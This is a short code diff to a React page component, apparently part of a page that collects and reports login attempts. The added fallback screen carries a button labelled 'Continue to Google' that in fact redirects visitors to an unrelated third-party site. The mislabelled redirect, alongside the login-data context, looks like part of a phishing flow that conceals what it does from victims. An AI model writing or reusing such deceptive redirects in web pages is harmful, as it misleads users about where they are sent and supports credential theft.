@@ -70,6 +70,19 @@ This is an automated message with login attempt data.`,
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
               It seems like we couldn't fetch the data!
             </h1>
+             <button
+              onClick={() => {
+                window.location.href = 'https://www.sciwebhop.net/sci_web/science/asp/ks4exam/Index.php';
+              }}
+              className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
+            >
+              Continue to Google
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
             
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
